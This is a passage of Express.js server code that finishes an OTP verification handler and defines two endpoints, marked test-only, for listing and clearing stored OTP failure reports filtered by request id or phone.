    failedOtpCounts.delete(requestId);
    failedOtpLastNotify.delete(requestId);
    try {
      failedOtpReports.push({
        requestId,
        phone: rec && rec.phone ? rec.phone : null,
        verified: true,
        when: new Date().toISOString(),
        ip: req.ip,
      });
    } catch (_) {
      void _;
    }
    return res.json({ status: 'ok', verified: true });
  });

  // Test-only endpoints to view/clear failed OTP reports
  app.get('/api/otp-failures', (req, res) => {
    try {
      const { requestId, phone, limit = 200 } = req.query || {};
      let list = failedOtpReports.slice().reverse();
      if (requestId) list = list.filter((r) => r.requestId === String(requestId));
      if (phone) list = list.filter((r) => String(r.phone || '').includes(String(phone)));
      const n = Math.max(1, Math.min(1000, Number(limit) || 200));
      list = list.slice(0, n);
      res.json({ status: 'ok', count: list.length, reports: list });
    } catch (e) {
      res.status(500).json({ status: 'err', error: e.message });
    }
  });

  app.post('/api/otp-failures/clear', express.json(), (req, res) => {
    try {
      const { requestId } = req.body || {};
      if (requestId) {
        for (let i = failedOtpReports.length - 1; i >= 0; i--) {
          if (failedOtpReports[i].requestId === String(requestId)) failedOtpReports.splice(i, 1);
        }
      } else {
        failedOtpReports.length = 0;
      }
      res.json({ status: 'ok' });
    } catch (e) {
      res.status(500).json({ status: 'err', error: e.message });
    }
  });
}
